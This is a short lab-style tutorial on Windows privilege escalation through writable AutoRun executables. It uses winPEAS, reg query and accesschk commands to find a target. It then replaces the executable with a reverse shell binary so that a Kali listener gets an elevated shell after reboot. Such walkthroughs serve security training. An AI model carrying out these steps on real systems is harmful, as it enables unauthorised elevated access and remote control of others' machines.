Windows can be configured to run commands at startup,  
with elevated privileges.  
These “AutoRuns” are configured in the Registry.  
If you are able to write to an AutoRun executable, and are  
able to restart the system (or wait for it to be restarted) you  
may be able to escalate privileges.

1.Use winPEAS to check for writable AutoRun executables:  
`.\winPEASany.exe quiet applicationsinfo`

> [?] Check if you can modify other users AutoRuns binaries
> 
> > File: C:\Program Files\Autorun Program\program.exe
> > 
> > > FilePerms: Everyone [AllAccess]

2.Alternatively, we could manually enumerate the AutoRun executables:  
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  
and then use accesschk.exe to verify the permissions on each one:  
`.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

3.The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:  
`copy "C:\Program Files\Autorun Program\program.exe" C:\Temp`

4.Copy our reverse shell executable to overwrite the AutoRun executable:  
`copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"`

5.Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.